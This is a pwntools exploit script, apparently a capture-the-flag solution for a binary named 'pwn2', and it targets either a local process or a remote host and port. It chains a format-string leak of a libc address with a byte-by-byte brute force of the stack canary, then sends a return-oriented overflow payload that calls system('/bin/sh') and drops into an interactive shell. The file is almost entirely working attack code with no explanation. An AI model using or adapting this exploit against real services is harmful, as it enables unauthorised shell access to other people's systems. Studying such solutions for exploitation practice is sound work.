from pwn import *
from LibcSearcher import *

context.binary = './pwn2'
context.log_level = 'debug'
context.timeout = None
elf = context.binary


libc = context.binary.libc
def dbg():
	raw_input()
if args['REMOTE']:
	p = remote('47.106.94.13', 50016)
	#libc = ELF('../x64_libc.so.6')
else:
	p = process('./pwn2')
	#gdb.attach(p, 'b* 0x400736')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x00000000004007f3 # pop rdi ; ret
main = 0x4006C6

p.recvuntil('me?[Y]\n')
canary = '\x00'				#last one byte
for i in range(3):
	for k in range(256):
		p.sendline('Y')
		p.recvuntil('[*] Input Your name please:\n')
		#leak libc
		p.sendline('%27$p+')
		p.recvuntil('game ')
		__libc_start_main_addr = int(p.recvuntil('+').strip('+'), 16) - 247
		libc_base = __libc_start_main_addr - libc.symbols['__libc_start_main']

		print "libc_base ==> " + hex(libc_base)

		p.recvuntil('Id:\n')
		p.send('a'* 0x10 + canary + chr(k))
		p.recvline()
		if 'love me?' in p.recvline(timeout = 1):
			canary += chr(k)
			break


#leak libc
print "libc_base ==> " + hex(libc_base)
print "canary ==> " + canary

libc = LibcSearcher('__libc_start_main', __libc_start_main_addr)
libc_base = __libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')


#p.recvuntil('Id:\n')
payload = 'a'*0x10 + canary + 'a' * 0xc + p32(system_addr) + p32(main) + p32(binsh)
p.send(payload)

p.interactive()
p.close()
